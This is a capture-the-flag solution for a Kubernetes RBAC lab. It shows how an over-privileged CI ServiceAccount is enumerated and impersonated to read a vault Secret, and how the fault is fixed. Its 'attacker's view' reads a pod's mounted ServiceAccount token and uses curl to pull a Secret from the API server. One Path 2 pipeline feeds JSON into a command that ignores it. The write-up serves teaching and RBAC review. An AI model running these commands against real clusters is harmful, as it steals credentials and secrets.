# Solution — The Over-Privileged Account

The flag is `KUBE{over_privileged_ci_reads_the_vault}`. Below are the paths, each a technique you would use in a real RBAC review or incident.

## Path 1 — enumerate the subject, then spend the privilege

Ask the API server what `ci-runner` can actually do:

```bash
kubectl auth can-i --list --as=system:serviceaccount:dojo-rbac:ci-runner
```

In the output you'll see rows that have no business being on a CI account, including:

```
Resources   Non-Resource URLs   Resource Names   Verbs
secrets     []                  []               [get list watch]
...
```

`[]` resource names + no namespace restriction in a `--list` of a cluster-wide binding means **every Secret in every namespace**. Confirm against the vault specifically, then read it as the SA:

```bash
kubectl auth can-i get secret -n dojo-vault \
  --as=system:serviceaccount:dojo-rbac:ci-runner
# -> yes

kubectl -n dojo-vault get secret vault-secret \
  -o jsonpath='{.data.FLAG}' \
  --as=system:serviceaccount:dojo-rbac:ci-runner | base64 -d; echo
# -> KUBE{over_privileged_ci_reads_the_vault}
```

The `--as` flag impersonates the ServiceAccount, so the `get` is authorized by *its* permissions, not yours — proving the over-grant is exploitable, not theoretical.

## Path 2 — follow the bindings backwards

Start from the binding and read the rules directly:

```bash
# Which ClusterRoleBindings name this SA as a subject?
kubectl get clusterrolebinding -o json \
  | kubectl get clusterrolebinding -o jsonpath='{range .items[?(@.subjects[0].name=="ci-runner")]}{.metadata.name}{"\n"}{end}'
# -> dojo-ci-runner-toobig

# What does the ClusterRole it points at actually grant?
kubectl get clusterrole dojo-ci-runner-toobig -o yaml
```

Seeing `resources: ["secrets", ...]` with `verbs: ["get","list","watch"]` in a **ClusterRole bound by a ClusterRoleBinding** is the finding: the binding, not the role, is what makes it cluster-wide. The same `ClusterRole` bound by a namespaced `RoleBinding` would only grant those verbs inside that one namespace.

## Path 3 — probe one capability before spending it

In a real engagement you don't fire every verb; you confirm the one that matters:

```bash
kubectl auth can-i get secret/vault-secret -n dojo-vault \
  --as=system:serviceaccount:dojo-rbac:ci-runner
```

A `yes` here is enough to justify the finding and to read the flag with the command from Path 1.

## The attacker's view

An attacker who compromises one CI pod that mounts this ServiceAccount's token does **not** need cluster-admin and does **not** need `--as`. They read the mounted token and hit the API directly:

```bash
# from inside a pod running as ci-runner
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
curl -sk -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/dojo-vault/secrets/vault-secret
```

One over-provisioned CI account turns a single compromised build pod into cluster-wide Secret exfiltration. That is why RBAC reviews start with "who can read secrets, and in which namespaces."

## The fix

- **Scope the binding, not just the role.** Replace the `ClusterRoleBinding` with a namespaced `RoleBinding` in the one namespace `ci-runner` deploys to. The blast radius drops from "the cluster" to "that namespace."

  ```bash
  kubectl delete clusterrolebinding dojo-ci-runner-toobig
  # then bind only where needed:
  kubectl -n dojo-apps create rolebinding ci-runner-deploy \
    --clusterrole=dojo-ci-runner-toobig \
    --serviceaccount=dojo-rbac:ci-runner
  ```

- **Drop `secrets` from the role entirely** unless the pipeline genuinely needs them, and never grant `verbs: ["*"]` where `["get","list","create","update","patch"]` will do.
- **Audit continuously.** `kubectl auth can-i --list --as=<subject>` belongs in a scheduled job that flags any non-admin subject that can `get secrets` cluster-wide.
